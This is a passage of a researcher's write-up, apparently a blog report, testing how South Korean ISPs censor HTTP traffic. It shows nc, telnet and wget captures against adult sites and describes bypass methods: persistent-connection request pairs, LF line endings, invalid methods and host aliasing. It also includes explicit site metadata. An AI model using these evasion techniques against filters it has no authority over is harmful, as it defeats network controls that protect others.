Set-Cookie: rand1=0000000000; expires=Fri, 01-Oct-2017 00:00:00 GMT; Max-Age=3600; path=/; domain=tube8.com
Set-Cookie: rand2=REMOVED; expires=Fri, 01-Oct-2017 00:00:00 GMT; Max-Age=3600; path=/; domain=tube8.com
Set-Cookie: GA-BE-SID=REMOVED
Vary: User-Agent, Accept-Encoding
Rating: RTA-5042-1996-1400-1577-RTA
Set-Cookie: RNLBSERVERID=ded1770; path=/

1e50
&lt;!DOCTYPE html&gt;
&lt;html class="en" lang="en" id="lang_en"&gt;
&lt;head&gt;
&lt;script type="text/javascript"&gt;
var rta = document.createElement('script');
rta.type = 'text/javascript';
rta.id = 'htScript';
rta.async = true;
rta.src = ('https:' == document.location.protocol ? 'https://' : 'http://')
[...]
</code></pre>
<p>Analysis: If you don't wait enough after sending the first request and then you send a second request with the same HTTP connection, the second HTTP request will not be analyzed by the censorship system.</p>
<p>I determined the sleep must be <code>&lt;= 0.3 second</code> to bypass the censorship. 0.4 second between HTTP requests with the same TCP connection will trigger the censorship system and the second request will be censored as shown below:</p>
<pre><code>user@kali:~$ cat tcp-http11-persistent-test1.sh                        
#!/bin/sh

(
# first request, asking information about /
echo 'HEAD / HTTP/1.1'
echo

sleep 0.5 # will produce the block


# second request, getting /
echo 'GET / HTTP/1.1'
echo 'Host: www.tube8.com'
echo
) | nc www.tube8.com 80
user@kali:~$
</code></pre>
<p>Testing this code will trigger the censorship system on the <code>GET</code> method:</p>
<pre><code>user@kali:~$ sh cat tcp-http11-persistent-test1.sh
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Content-Length: 178
Location: http://www.tube8.com/400.html
Vary: User-Agent, Accept-Encoding
Rating: RTA-5042-1996-1400-1577-RTA
Set-Cookie: RNLBSERVERID=ded1770; path=/

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

user@kali:~$
</code></pre>
<p><a id="http-vs-https"></a></p>
<h4>3.5.4 HTTP vs. HTTPS</h4>
<p>As there are no HTTPS websites in the Wikipedia list of censored websites, I had to use <a href="https://github.com/aredo/porn-site-list/blob/master/sites.json">https://github.com/aredo/porn-site-list/blob/master/sites.json</a> to find censored websites with different characteristics (HTTP and HTTPS). Apparently, a lot of adult websites don't provide HTTPS versions. <strong>Booooh</strong>.</p>
<p>Only a few adult websites are using HTTPS. <code>Google.com</code> helped me find a candidate supporting HTTP and HTTPS: <code>www.tnaflix.com</code> (heavily NSFW, found with "porn using https").</p>
<p><code>www.tnaflix.com</code> is censored by default. It will redirect to <code>http://www.warning.or.kr/</code>:</p>
<pre><code>user@kali:~$ wget http://www.tnaflix.com/
--2016-10-01 XX:XX:XX--  http://www.tnaflix.com/
Resolving www.tnaflix.com (www.tnaflix.com)... 108.61.250.17
Connecting to www.tnaflix.com (www.tnaflix.com)|108.61.250.17|:80... connected.
HTTP request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01XX:XX:XX--  http://www.warning.or.kr/
Resolving www.warning.or.kr (www.warning.or.kr)... 121.189.57.82
Connecting to www.warning.or.kr (www.warning.or.kr)|121.189.57.82|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'index.html.6'

index.html.6                                         100%[=====================================================================================================================&gt;]  10.34K  --.-KB/s    in 0.01s

2016-10-01 XX:XX:XX (1002 KB/s) - 'index.html.6' saved [10590/10590]
user@kali:~$
</code></pre>
<p>Now the HTTPS version will provide the original 179KB of the webpage:</p>
<pre><code>user@kali:~$ wget https://www.tnaflix.com/
--2016-10-01 XX:XX:XX--  https://www.tnaflix.com/
Resolving www.tnaflix.com (www.tnaflix.com)... 108.61.250.17
Connecting to www.tnaflix.com (www.tnaflix.com)|108.61.250.17|:443...connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'index.html.4'

index.html.4                                             [    &lt;=&gt;] 180.17K  97.7KB/s    in 1.8s

2016-10-01 XX:XX:XX (97.7 KB/s) - 'index.html.4' saved [184492]
user@kali:~$
</code></pre>
<p><strong>Using HTTPS will completely bypass the "Warning webpage" from South Korean Agency, sus, bypassing the censorship.</strong></p>
<p><a id="random-behaviors-provided-by-the-censorship-system"></a></p>
<h4>3.5.5 Random behaviors provided by the censorship system</h4>
<p>Note that there are different behaviors with the censorship.
For some websites blocked in HTTP, sometimes they can be browsed and sometimes they are blocked.
It shows there is a BIG problem about transparent proxies (and it added complexity for me to debug/understand technologies involved). To demonstrate this:</p>
<p>Access OK:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com

HTTP/1.1 301 Moved Permanently
Server: nginx/1.10.1
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.0.5
Location: http://xhamster.com/

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>Access blocked seconds later:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com

HTTP/1.0 302 Redirect
Location: http://www.warning.or.kr

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p>Access OK seconds later:</p>
<pre><code>user@kali:~$ telnet www.xhamster.com 80
Trying 88.208.29.24...
Connected to www.xhamster.com.
Escape character is '^]'.
GET / HTTP/1.0
Host: www.xhamster.com

HTTP/1.1 301 Moved Permanently
Server: nginx/1.10.1
Date: Fri, 01 Oct 2016 00:00:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.0.5
Location: http://xhamster.com/

Connection closed by foreign host.
user@kali:~$
</code></pre>
<p><a id="cdn-for-content"></a></p>
<h4>3.5.6 CDN for content (VOD/images)</h4>
<p>A lot of censored websites are using CDN to deliver online videos and images. These CDNs hosts don't seem to be censored even when clear text HTTP is being used.</p>
<p>The domains used in CDNs are not blacklisted by transparent proxies but by main domain names (www.stuff.tld, subdomain.stuff.tld).</p>
<p><a id="http2-for-http-uris"></a></p>
<h4>3.5.7 HTTP2 for http URIs</h4>
<p>I could not find censored websites supporting HTTP2 without HTTPS, so I was not able to test. However, considering how primitive the transparent proxies are, I'm sure it is not blocked.</p>
<p>But the lack of browser supporting this option limits the use of this technique to bypass the censorship:</p>
<blockquote>
<p>However, some implementations have stated that they will only support HTTP/2 when it is used over an encrypted connection, and currently no browser supports HTTP/2 unencrypted.</p>
<p>-- <cite><a href="https://http2.github.io/faq/#does-http2-require-encryption">https://http2.github.io/faq/#does-http2-require-encryption</a></cite></p>
</blockquote>
<p><a id="websockets"></a></p>
<h4>3.5.8 WebSockets</h4>
<p>I could not find censored websites supporting Websockets but, considering how primitive the transparent proxies are, there is a high probability that it is not censored.</p>
<p><a id="http2-for-https-uris"></a></p>
<h4>3.5.9 HTTP2 for https URIs</h4>
<p>As already shown, HTTPS websites are not censored. HTTPS with or without HTTP2 will allow to bypass the censorship.</p>
<p>HTTP/1.1 in clear text with the HTTP/2 <code>upgrade</code> header will be triggered by the censorship system (because of the <code>Host</code> header):</p>
<pre><code>GET / HTTP/1.1
Host: server.example.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: &lt;base64url encoding of HTTP/2 SETTINGS payload&gt;
</code></pre>
<p><a id="readline-vs-buffered-http-requests"></a></p>
<h4>3.5.10 Readline vs. buffered HTTP requests</h4>
<p>From my tests, I observed different behaviors when the request is sent line by line and when it's buffered and sent all together.
<strong>This is a rare occurrence and I can't understand why</strong>.</p>
<p>Sending this request line by line on KT network will work (but not on SKT):</p>
<pre><code>user@kali:~$ cat /dev/shm/req.txt 
GET / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: www.youjizz.com
Connection: Keep-Alive
user@kali:~$
</code></pre>
<p>Using readline (netcat), the connection will be blocked:</p>
<pre><code>user@kali:~$ cat /dev/shm/req.txt| nc www.youjizz.com 80
HTTP/1.0 200 OK
Content-type: text/html

&lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
user@kali:~$
</code></pre>
<p>Using buffered HTTP requests (with telnet) - the connection will be uncensored:</p>
<pre><code>user@kali:~$ telnet www.youjizz.com 80   
Trying 31.192.122.224...
Connected to www.youjizz.com.
Escape character is '^]'.
GET / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: www.youjizz.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx/1.9.5
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: close
X-Powered-By: PHP/5.2.17
Set-Cookie: PHPSESSID=REMOVED; path=/
Expires: Thu, 01 Oct 1981 00:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Set-Cookie: RNLBSERVERID=ded1416; path=/

e69

&lt;!DOCTYPE html&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
&lt;meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /&gt;
&lt;meta name="KEYWORDS" content="porn tube,you porn,sex tube,porntube,youporn,sextube,tube porn,porno tube,sex,free sex,mobile porn,iphone porn,phone porn,free porn videos,free sex movies,vids,adult,movie,amateur porn,anal sex,big dicks,big tits,blowjob,creampie,cumshot,hardcore,teen porn,youjizz,youjizz.com,nude teens,teen sex,hardcore sex,xxx adult video,porn videos,hardcore video,porn movies,teen hardcore,milf hardcore,sex movies,porn links,sex movies,all porn"/&gt;
&lt;meta name="DESCRIPTION" content="Youjizz Porn Tube! Free porn movies and sex videos on your desktop or mobile phone."/&gt;
[...]
</code></pre>
<p>The same result with netcat - the connection will be uncensored:</p>
<pre><code>user@kali:~$ nc www.youjizz.com 80   
Trying 31.192.122.224...
Connected to www.youjizz.com.
Escape character is '^]'.
GET / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: www.youjizz.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx/1.9.5
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: close
X-Powered-By: PHP/5.2.17
Set-Cookie: PHPSESSID=REMOVED; path=/
Expires: Thu, 01Oct 1981 00:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Set-Cookie: RNLBSERVERID=ded1416; path=/

e69

&lt;!DOCTYPE html&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
&lt;meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /&gt;
&lt;meta name="KEYWORDS" content="porn tube,you porn,sex tube,porntube,youporn,sextube,tube porn,porno tube,sex,free sex,mobile porn,iphone porn,phone porn,free porn videos,free sex movies,vids,adult,movie,amateur porn,anal sex,big dicks,big tits,blowjob,creampie,cumshot,hardcore,teen porn,youjizz,youjizz.com,nude teens,teen sex,hardcore sex,xxx adult video,porn videos,hardcore video,porn movies,teen hardcore,milf hardcore,sex movies,porn links,sex movies,all porn"/&gt;
&lt;meta name="DESCRIPTION" content="Youjizz Porn Tube! Free porn movies and sex videos on your desktop or mobile phone."/&gt;
</code></pre>
<p>From nc manpage:</p>
<blockquote>
<p>Data from the network connection is always delivered to standard output as efficiently as possible, using large 8K reads and writes.  Standard input is normally sent to the net in the same way, but the -i switch specifies an "interval time" which slows this down considerably.  Standard input is still read in large batches, but netcat then tries to find where line breaks exist and sends one line every interval time.  Note that if standard input is a terminal, data is already read line by line, so unless you make the -i interval rather long, what you type will go out at a fairly normal rate.  -i is really designed for use when you want to "measure out" what is read from files or pipes.</p>
<p>-- <code>man 1 nc</code></p>
</blockquote>
<p>A basic test is provided with a second website:</p>
<pre><code>user@kali:~$ cat buffered-request.sh 
echo GET / HTTP/1.0
echo Host: www.xhamster.com
echo
user@kali:~$
</code></pre>
<p>Using <code>nc</code> with a pipe will have my request censored:</p>
<pre><code>user@kali:~$ sh buffered-request.sh | nc www.xhamster.com 80

HTTP/1.0 200 OK
Content-type: text/html

&lt;html&gt;&lt;script&gt;
var arg = "http://warning.or.kr";
var str = new Array();
str = arg.split("&amp;", 1);
var a = new Array();
a = str[0].split("=");
var b = Math.floor(a[1] / 100);
var c = new Array();
if(b == 10){location.replace("http://www.naver.com");}
else if(b == 20){location.replace("http://www.daum.net");}
else if(b == 30){location.replace("http://www.paran.com");}
else{ c = a[0].split("?");
location.replace(c[0]);}
&lt;/script&gt;&lt;/html&gt;
</code></pre>
<p>Using <code>nc</code> within a shell will bypass the censorship:</p>
<pre><code>user@kali:~$ nc www.xhamster.com 80
GET / HTTP/1.0
Host: www.xhamster.com

HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Fri, 01 Oct 2016 00:00:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: http://xhamster.com/
</code></pre>
<p><strong>Analysis</strong>: if you send HTTP requests line by line, you "CAN" bypass the censorship system. Unfortunately, browsers are sending requests in a big buffer. Note this is specific to the KT ISP. I think they are using a specific version of the censorship cluster, as the behavior is inconsistent with the other 2 ISPs.</p>
<p><a id="http-proxies"></a></p>
<h2>4. Using HTTP proxies</h2>
<p>Using <a href="http://www.samair.ru/">samair.ru</a> services and proxies in private VPS, I determined that all the TCP ports are being watched.</p>
<p>When a proxy with port <code>80/tcp</code> is used, the request is blocked:</p>
<pre><code>user@kali:~$ http_proxy=http://115.159.XXX.XXX:80/ wget http://www.tube8.com
--2016-10-01 00:00:00--  http://www.tube8.com/
Connecting to 115.159.XXX.XXX:80... connected.
Proxy request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 00:00:00--  http://www.warning.or.kr/
Connecting to 115.159.217.30:80... connected.
[...]
</code></pre>
<p>When proxy with port <code>2222/tcp</code> is used, the request is blocked:</p>
<pre><code>user@kali:~$ http_proxy='http://9X.XX.XX.XX:2222/' wget http://www.redtube.com/
--2016-10-01 00:00:00--  http://www.redtube.com/
Connecting to 9X.XX.XX.XX:2222... connected.
Proxy request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 00:00:00--  http://www.warning.or.kr/
Connecting to 9X.XX.XX.XX:2222... connected.
Proxy request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'index.html.2'

index.html.2        100%[===================&gt;]  10.34K  16.8KB/s    in 0.6s

2016-10-01 00:00:00 (16.8 KB/s) - 'index.html.2' saved [10590/10590]

user@kali:~$
</code></pre>
<p>When a proxy with port <code>3128/tcp</code> is used, the request is blocked too:</p>
<pre><code>user@kali:~$ http_proxy='http://9X.XX.XX.XX:3128/' wget http://www.tube8.com
--2016-10-01 XX:XX:XX--  http://www.tube8.com/
Connecting to 9X.XX.XX.XX:3128... connected.
Proxy request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 XX:XX:XX--  http://www.warning.or.kr/
Connecting to 9X.XX.XX.XX:3128... connected.
Proxy request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'index.html.1'

index.html.1        100%[===================&gt;]  10.34K  20.1KB/s    in 0.5s

2016-10-01 XX:XX:XX (20.1 KB/s) - 'index.html.1' saved [10590/10590]

user@kali:~$
</code></pre>
<p>When a proxy with port <code>54182/tcp</code> is used, the request is blocked too:</p>
<pre><code>user@kali:~$ http_proxy='http://9X.XX.XX.XX:54182/' wget http://www.tube8.com
--2016-10-01 XX:XX:XX--  http://www.tube8.com/
Connecting to 9X.XX.XX.XX:54182... connected.
Proxy request sent, awaiting response... 302 Redirect
Location: http://www.warning.or.kr [following]
--2016-10-01 00:00:00--  http://www.warning.or.kr/
Connecting to 9X.XX.XX.XX:54182... connected.
Proxy request sent, awaiting response... 200 OK
Length: 10590 (10K) [text/html]
Saving to: 'index.html.1'

index.html.1        100%[===================&gt;]  10.34K  20.1KB/s    in 0.5s

2016-10-01 XX:XX:XX (20.1 KB/s) - 'index.html.1' saved [10590/10590]

user@kali:~$
</code></pre>
<p><strong>Analysis</strong>: the censorship system is analyzing ALL the HTTP packets.</p>
<p><a id="ipv6"></a></p>
<h2>5. IPv6</h2>
<p>Unfortunately the censorship system with IPv6 packets cannot be tested as it is impossible to get an IPv6 in South Korea :(</p>
<p><a id="bypassing-the-filter"></a></p>
<h2>6. Bypassing the filter</h2>
<p>I will show different measures that do not require a VPN to bypass the censorship.</p>
<p><a id="bypassing-by-using-a-different-vhost"></a></p>
<h3>6.1. By using a different vhost (easy-PoC)</h3>
<p>This is the easiest solution but requires a wildcard configuration in the remote http website you want to visit.</p>
<p>As seen before, <code>www.tube8.com</code> webservers accept all vhosts to serve <code>www.tube8.com</code> webpages.</p>
<p>We get the IP of <code>www.tube8.com</code>:</p>
<pre><code>user@kali:~$ host www.tube8.com
www.tube8.com has address 31.192.112.104
user@kali:~$
</code></pre>
<p>By simply adding the IP to the <code>/etc/hosts</code> file on Linux, you will associate a new host:</p>
<pre><code>root@kali:~# echo "31.192.112.104 this.is.not.tube8" &gt;&gt; /etc/hosts
</code></pre>
<p>By visiting <code>http://this.is.not.tube8/</code>, you will have access to the <code>tube8.com</code> website evading the censorship (the resulting image was censored by me):</p>
<p><img alt="" src="images/2016-censorship-screenshot-this.is.not.tube8.png" /></p>
<p>You can also use a proxy that rewrites all the requests.</p>
<p>We will code a proxy for the next solutions only :)</p>
<p><a id="bypassing-by-using-http-persistent-connection-head-then-get"></a></p>
<h3>6.2. By using HTTP persistent connection: HEAD then GET</h3>
<p>The censorship only works on the first HTTP request when using a HTTP/1.1 persistent connection as long as the second request is sent fast enough (&lt; 0.3s). If you use it within 0.3s, you can force the remote transparent proxies to skip the verification.</p>
<p>From my tests, doing a HTTP/1.1 keep-alive request with 1 <code>GET</code> then waiting less than 0.3s and asking a new <code>GET</code> will bypass the censorship. A delay more than 0.3s between the requests will force a verification by the transparent proxies. Doing 2x <code>GET</code> for each resource is too expensive in bandwidth term. We will prefer using a <code>HEAD</code> instead of the first <code>GET</code> request (you can use a <code>PUT</code> or whatever you want).</p>
<p>By exploiting this fact it is very easy to bypass censorship - see a HTTP proxy as provided below:</p>
<ul>
<li>Step 1: client sends a request to the proxy: <code>GET http://google.com/ HTTP/1.1</code></li>
<li>Step 2: the proxy sends a request to the remote HTTP server containing below:</li>
</ul>
<pre>
HEAD / HTTP/1.1
Host: hacktheplanet

GET http://google.com/ HTTP/1.1\r\n\r\n
</pre>

<ul>
<li>Step 3: the proxy sends to the client the answer of the second request (<code>GET http://google.com/ HTTP/1.1</code>) from the HTTP/1.1 keep-alive session, skipping the answer of the <code>HEAD / HTTP/1.1</code> request.</li>
</ul>
<p>The bypass is complete but requires sending a <code>HEAD</code> for each <code>GET</code>.</p>
<p>Example:</p>
<p>Someone wants to visit <code>www.xhamster.com</code>:</p>
<pre><code>user@kali:~$ http_proxy=http://127.0.0.1:8081/ firefox http://www.xhamster.com/ &amp;!
</code></pre>
<p>The proxy logs will show you the requests of the client:</p>
<pre><code>user@kali:~$ ./proxy-head-then-get.py
Starting HEAD-then-GET PoC Proxy Server on 127.0.0.1 : 8081
Request to http://www.xhamster.com/
Request to http://xhamster.com/
Request to http://static-ec.xhcdn.com/id93/css/main2.css
Request to Request to http://static-ec.xhcdn.com/id277/js/main2.jshttp://static-ec.xhcdn.com/js/jquery-1.9.1.o.min.js
Request to Request to Request to Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
http://static-ec.xhcdn.com/id2/js/ads.js
http://static-ec.xhcdn.com/id16/js/track.min.jsRequest to http://static-ec.xhcdn.com/id4/js/ablockhint.js
http://cdn.trafficstars.com/sdk/v1/p.js
Request to http://static-ec.xhcdn.com/images/favicon/favicon-128x128.png
Request to http://ocsp.digicert.com/
Request to http://static-ec.xhcdn.com/id16/js/track.min.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/id93/css/main2.css
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://xhamster.com/
Request to http://static-ec.xhcdn.com/id93/css/main2.css
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://static-ec.xhcdn.com/id2/js/ads.js
Request to http://static-ec.xhcdn.com/id16/js/track.min.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/js/jquery-1.9.1.o.min.js
Request to http://static-ec.xhcdn.com/id277/js/main2.js
Request to http://cdn.trafficstars.com/sdk/v1/p.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to Request to http://static-ec.xhcdn.com/images/flag/v3/KR.png
http://txh.xhcdn.com/t/685/9_6478685.jpg
Request to Request tohttp://txh.xhcdn.com/t/050/9_6478050.jpg
http://static-ec.xhcdn.com/images/tpl2/rta.png
Request toRequest to http://txh.xhcdn.com/t/482/1_6478482.jpg
Request to http://txh.xhcdn.com/t/287/1_6478287.jpg
Request to http://txh.xhcdn.com/t/685/9_6478685.jpg
^CTraceback (most recent call last):
  File "./proxy-head-then-get.py", line 95, in &lt;module&gt;
main()
  File "./proxy-head-then-get.py", line 45, in main
conn, client_addr = s.accept()
  File "/usr/lib/python2.7/socket.py", line 206, in accept
sock, addr = self._sock.accept()
KeyboardInterrupt
user@kali:~$
</code></pre>
<p>This proxy will successfully bypass the censorship system. The user has a full access to the censored website.</p>
<p>Example with <code>www.youporn.com</code>:</p>
<p><img alt="" src="images/2016-censorship-screenshot-head-then-get.png" /></p>
<p>You can fetch this PoC at <a href="https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-head-then-get.py">https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-head-then-get.py</a>.</p>
<p><a id="bypassing-by-using-http-persistent-connection-get-then-get"></a></p>
<h3>6.3. By using HTTP persistent connection: GET then GET</h3>
<p>As seen in the 6.2 section, you can use multiple HTTP requests inside a HTTP connection.</p>
<p>To avoid using too much bandwidth asking the remote resource twice, we can do the following:</p>
<ul>
<li>
<p>Step 1: client sends a request to the proxy: <code>GET http://google.com/ HTTP/1.1</code></p>
</li>
<li>
<p>Step 2: the proxy sends a request to the remote HTTP server containing below:</p>
</li>
</ul>
<pre>
GET /random-404-blabla HTTP/1.1
Host: hacktheplanet

GET http://google.com/ HTTP/1.1\r\n\r\n
</pre>

<ul>
<li>Step 3: the proxy sends the answer of the second request (<code>GET http://google.com/ HTTP/1.1</code>) from the HTTP/1.1 keep-alive session, skipping the answer of the first <code>GET</code> request.</li>
</ul>
<p>This allows to completely bypass the censorship.</p>
<p>A PoC (proxy) is provided and works as long as the size of the 404 page is small.</p>
<p>The PoC in action while the user wants to visit a censored webpage (using the 127.0.0.1:8082) proxy is below:</p>
<pre><code>user@kali:~$ http_proxy=http://127.0.0.1:8082/ ./proxy-get-then-get.py
Starting GET-then-GET PoC Proxy Server on 127.0.0.1 : 8082
Request to http://xhamster.com/
Request to http://static-ec.xhcdn.com/id93/css/main2.css
Request to Request toRequest to http://static-ec.xhcdn.com/id4/js/ablockhint.js
 http://static-ec.xhcdn.com/id277/js/main2.jsRequest to http://static-ec.xhcdn.com/id2/js/ads.js
http://static-ec.xhcdn.com/js/jquery-1.9.1.o.min.js

Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
 Request to http://static-ec.xhcdn.com/id16/js/track.min.js
Request to http://static-ec.xhcdn.com/images/favicon/favicon-128x128.png
Unhandled exception in thread started by &lt;function proxy_thread at 0x7f0e80592140&gt;
Traceback (most recent call last):
  File "./proxy-get-then-get.py", line 54, in proxy_thread
url        = first_line.split(' ')[1]
IndexError: list index out of range
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://static-ec.xhcdn.com/id2/js/ads.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://cdn.trafficstars.com/sdk/v1/p.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://static-ec.xhcdn.com/id2/js/ads.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://static-ec.xhcdn.com/id16/js/track.min.js
Request to http://static-ec.xhcdn.com/images/favicon/favicon-128x128.png
Unhandled exception in thread started by &lt;function proxy_thread at 0x7f0e80592140&gt;
Traceback (most recent call last):
  File "./proxy-get-then-get.py", line 54, in proxy_thread
url        = first_line.split(' ')[1]
IndexError: list index out of range
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://static-ec.xhcdn.com/id2/js/ads.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://cdn.trafficstars.com/sdk/v1/p.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/id3/js/private/private.min.js
Request to http://static-ec.xhcdn.com/id2/js/ads.js
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://clients1.google.com/ocsp
Request to http://static-ec.xhcdn.com/id4/js/ablockhint.js
Request to http://static-ec.xhcdn.com/images/snapchat/snapchat-image.png
Request to http://txh.xhcdn.com/t/480/7_6062480.jpg
 Request to http://static-ec.xhcdn.com/images/tpl2/rta.png
[...]
</code></pre>
<p>This proxy will successfully bypass the censorship system. The user has a full access to the censored website.</p>
<p>You can fetch this PoC at <a href="https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-get-then-get.py">https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-get-then-get.py</a>.</p>
<p><a id="bypassing-by-lf-instead-of-crlf"></a></p>
<h3>6.4. By using \n instead of \r\n in the HTTP requests (unreliable method)</h3>
<p>The censorship engine on the edge of KT network only supports \r\n in HTTP requests.</p>
<p>By using <code>\n</code> inside your http requests instead of <code>\r\n</code>, you will completely bypass the censorship system.</p>
<p>From <a href="https://www.ietf.org/rfc/rfc2616.txt">RFC2616</a>:</p>
<blockquote>
<p>CR = &lt;US-ASCII CR, carriage return (13)&gt;</p>
<p>LF = &lt;US-ASCII LF, linefeed (10)&gt;</p>
<p>HTTP/1.1 defines the sequence CR LF as the end-of-line marker for all protocol elements except the entity-body</p>
</blockquote>
<p>However, there is a "tolerance provision" in Section 19.3 in <a href="https://www.ietf.org/rfc/rfc2616.txt">RFC2616</a>:</p>
<blockquote>
<p>The line terminator for message-header fields is the sequence CRLF. However, we recommend that applications, when parsing such headers, recognize a single LF as a line terminator and ignore the leading CR.</p>
</blockquote>
<p>The censorship system located on the edge of KT network only supports <code>\r\n</code>, so using <code>\n</code> will bypass the censorship and allow access to servers accepting <code>\n</code> (like 100% of the available HTTP servers).</p>
<p>A proxy is provided:</p>
<pre><code>user@kali:~$ python proxy-crlf-to-lf.py
Starting CRLF-to-LF PoC Proxy Server on 127.0.0.1 : 8080
Works using KT
Request to http://localhost/
</code></pre>
<p>Using <code>127.0.0.1:8080</code> as a proxy will rewrite all the HTTP requests without having to configure anything.</p>
<p>This method is unreliable and may not work sometimes. I bet I'm using a specific cluster of transparent proxies that are very HTTP-compliant.</p>
<p>Note to the developers of the transparent proxies: seriously guys? Only accepting <code>\r\n</code> as a valid method and allowing <code>\n</code> to bypass all the filters? This smells like a nice backdoor feature.</p>
<p>You can fetch this PoC at <a href="https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-crlf-to-lf.py">https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-crlf-to-lf.py</a>.</p>
<p><a id="bypassing-by-using-http-invalid-methods"></a></p>
<h3>6.5. By using HTTP invalid methods</h3>
<p>As you may know, there are a lot of HTTP methods: <code>PUT</code>, <code>GET</code>, <code>POST</code>, <code>TRACE</code>...</p>
<p>You can define an <code>X</code> method instead of <code>GET</code>. Apache2 is very permissive and will serve the webpages even if it's not a valid method. Nginx will refuse invalid methods.</p>
<p>A PoC is provided and will rewrite all the <code>GET</code> into a <code>X</code> producing these requests:</p>
<pre><code>X / HTTP/1.0
Host: www.website.com
</code></pre>
<p>The problem is that CDN used for JavaScript/images will refuse the <code>X</code> method and you will see borked websites.</p>
<p>Using the list provided at <a href="https://github.com/aredo/porn-site-list/blob/master/sites.json">https://github.com/aredo/porn-site-list/blob/master/sites.json</a>, I determined 50% of the websites are reachable using this technique.</p>
<p>You can fetch this PoC at <a href="https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-X-method.py">https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-X-method.py</a>.</p>
<p><a id="bypassing-by-sending-http-requests-line-by-line"></a></p>
<h3>6.6. By sending HTTP requests line by line</h3>
<p>As <a href="#readline-vs-buffered-http-requests">demonstrated above in the section 3.5.10</a>, if you send requests line by line using the KT network, you will bypass the censorship system.</p>
<p>A proxy is provided in the PoC and will modify the requests.</p>
<p>The important part is:</p>
